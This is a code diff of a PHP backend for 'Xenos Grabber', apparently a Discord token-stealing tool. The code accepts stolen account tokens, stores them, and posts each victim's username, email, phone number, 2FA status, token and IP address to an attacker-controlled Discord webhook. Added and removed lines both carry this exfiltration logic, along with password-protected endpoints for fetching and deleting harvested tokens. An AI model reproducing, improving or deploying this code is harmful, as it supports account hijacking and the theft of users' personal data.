@@ -5,8 +5,7 @@
     // API Return JSON
 
     $reponse['success'] = false;
-    $password = "YOUR ACCESS PASSWORD";
-    $webhook = "YOUR WEBHOOK";
+    global $api_webhook, $base_url, $api_password;
 
     if(isset($_GET['type']) AND !empty($_GET['type'])) {
         $token = htmlspecialchars($_GET['token']);
@@ -68,7 +67,7 @@
                             $reponse['success'] = true;
                             $reponse['message'] = 'Token Added to Database.';
                             
-                            SendToWebhook($webhook, json_encode(["username" => "Xenos Grabber","avatar_url" => "https://kanekiweb.tk/assets/img/xenos.gif","embeds" => [["description" => ">>> __Account Informations:__\n```asciidoc\n- Username: " . strval($data->username)."#".strval($data->discriminator) . "\n- User ID: ".strval($data->id)."\n- Email: ".strval($data->email)."\n- Phone: ".strval($phone)."\n- Nitro Type: ".strval($nitro_type)."\n- A2F Enable: ".$mfa."\n```\n\n__Token:__\n```".$token."```\nIP Adress: `".$_SERVER['REMOTE_ADDR']."`","footer" => ["text" => "Xenos Grabber - https://github.com/KanekiWeb","icon_url" => "https://kanekiweb.tk/assets/img/xenos.gif"],"thumbnail" => ["url" => "https://cdn.discordapp.com/avatars/" . $data->id . "/" . $data->avatar]]]]));
+                            SendToWebhook($api_webhook, json_encode(["username" => "Xenos Grabber","avatar_url" => "https://kanekiweb.tk/assets/img/xenos.gif","embeds" => [["description" => ">>> __Account Informations:__\n```asciidoc\n- Username: " . strval($data->username)."#".strval($data->discriminator) . "\n- User ID: ".strval($data->id)."\n- Email: ".strval($data->email)."\n- Phone: ".strval($phone)."\n- Nitro Type: ".strval($nitro_type)."\n- A2F Enable: ".$mfa."\n```\n\n__Token:__\n```".$token."```\nIP Adress: `".$_SERVER['REMOTE_ADDR']."`","footer" => ["text" => "Xenos Grabber - https://github.com/KanekiWeb","icon_url" => "https://kanekiweb.tk/assets/img/xenos.gif"],"thumbnail" => ["url" => "https://cdn.discordapp.com/avatars/" . $data->id . "/" . $data->avatar]]]]));
                         } else {
                             $reponse['message'] = 'Token already in our Database.';
                         }
@@ -81,14 +80,14 @@
             } else if(htmlspecialchars($_GET['type']) == "removetoken") {
                 $input_pass = htmlspecialchars($_GET['password']);
                 if(isset($input_pass) && !empty($input_pass)) {
-                    if($input_pass == $password) {
+                    if($input_pass == $api_password) {
                         $check = $bdd->prepare('DELETE FROM tokens WHERE token = ?');
                         $check->execute(array($token));
 
                         $reponse['success'] = true;
                         $reponse['message'] = 'Token Deleted from the Database.';
 
-                        SendToWebhook($webhook, json_encode(["username" => "Xenos Grabber","avatar_url" => "https://kanekiweb.tk/assets/img/xenos.gif","embeds" => [["description" => "> Token Removed From Database:\n```" . $token . "```\nIp Adress: `".$_SERVER['REMOTE_ADDR']."`","footer" => ["text" => "Xenos Grabber - https://github.com/KanekiWeb","icon_url" => "https://kanekiweb.tk/assets/img/xenos.gif"]]]]));
+                        SendToWebhook($api_webhook, json_encode(["username" => "Xenos Grabber","avatar_url" => "https://kanekiweb.tk/assets/img/xenos.gif","embeds" => [["description" => "> Token Removed From Database:\n```" . $token . "```\nIp Adress: `".$_SERVER['REMOTE_ADDR']."`","footer" => ["text" => "Xenos Grabber - https://github.com/KanekiWeb","icon_url" => "https://kanekiweb.tk/assets/img/xenos.gif"]]]]));
 
                     } else {
                         $reponse['message'] = 'Incorrect Password';
@@ -99,7 +98,7 @@
             } else if(htmlspecialchars($_GET['type']) == "fetchtoken") {
                 $input_pass = htmlspecialchars($_GET['password']);
                 if(isset($input_pass) && !empty($input_pass)) {
-                    if($input_pass == $password) {
+                    if($input_pass == $api_password) {
                         $check = $bdd->prepare('SELECT * FROM tokens WHERE token = ?');
                         $check->execute(array($token));
                         $data = $check->fetch();
@@ -133,7 +132,11 @@
     } else {
         $reponse['message'] = 'Invalid Request type: addtoken/removetoken/fetchtoken';
     }
-
-    echo json_encode($reponse);
+    
+    if(strpos($_SERVER['HTTP_REFERER'], $base_url)) {
+        header('Location: '. $_SERVER['HTTP_REFERER']); die();
+    } else {        
+        echo json_encode($reponse);
+    }
 
 ?>
